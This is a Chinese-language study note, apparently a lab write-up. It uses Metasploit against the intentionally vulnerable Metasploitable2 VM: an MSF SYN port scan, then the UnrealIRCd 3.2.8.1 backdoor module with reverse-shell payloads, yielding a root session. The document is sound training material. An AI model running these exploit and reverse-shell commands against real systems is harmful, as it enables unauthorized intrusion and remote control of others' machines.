ailx10说：这篇是在2023年3月之前写的，后来又改过。这一章又回到熟悉的 Metasploit，但目标换成专门练习的 Metasploitable2。我先跑 SYN 扫描，再找 UnrealIRCd 的后门模块，沿参数和结果走到会话。过程中还忍不住嫌扫描慢，就顺手把这种实际感受也写了进去。书上流程很连贯，自己操作时却总会在等待、版本和参数上停一停。这篇留下的正是那次把一套现成靶场跑完的节奏，既复习工具怎么用，也看看从发现端口到确认服务，再到后续动作之间怎样接力。

---

Metasploitable2靶场使用MSF SYN扫描与UnrealIRCd后门模块获得root控制，作者觉得扫描慢。

本稿根据历史读书笔记整理，软件界面及工具行为可能变化，实验结果须结合版本和环境解读。

## 前提和待核查点

Metasploit工具和Metasploitable靶场名要分；两次set payload以后者为准，后门执行非独立提权漏洞。

## 历史实验记录

网络安全防御实战--蓝军武器库是2020年出版的，已经过去3年时间了，最近利用闲暇时间，抓紧吸收，总的来说，第10章开始学习利用metasploit渗透测试工具去打metasploit2虚拟机，本文我演示了metasploit端口扫描和漏洞利用，更多有趣的渗透测试实验，有待大家挖掘\~

- ailx10：metasploit渗透测试入门
- ailx10：使用metasploit获取域散列值
- ailx10：Meterpreter渗透测试入门

1、启动metasploitable2虚拟机，拿到IP地址（192.168.85.171）

![](/notes-assets/4df0bc3adc691d44e8f8.webp)

2、访问web页面，里面有很多白帽子黑客练习的靶场

![](/notes-assets/91de9df12832af8324e3.webp)

3、使用root 身份 运行 kali 的 msfconsole ，对metasploitable2进行syn端口扫描

```
search portscan

use auxiliary/scanner/portscan/syn

set RHOSTS 192.168.85.171
```

![](/notes-assets/ac0a30b5cc565284a90e.webp)

4、查看syn端口扫描结果，体验很慢，不如 nmap

![](/notes-assets/40702197c21292b39dc3.webp)

5、漏洞模块利用靶场已有的 UnrealIRCd 后门，获得了该环境中的高权限会话；这不应直接描述为另一个独立提权漏洞。

```
use exploit/unix/irc/unreal_ircd_3281_backdoor



set RHOSTS 192.168.85.171

set payload generic/shell_reverse_tcp

set payload cmd/unix/reverse

set lhost 192.168.85.23

run
```

![](/notes-assets/45b3e97044b6485f14ee.webp)

拿到root会话要追到具体后门和执行身份，不能凭结果补出一个额外提权漏洞。分清每一步获得了什么，实验才能帮助理解攻击链，而不只是记住模块名。
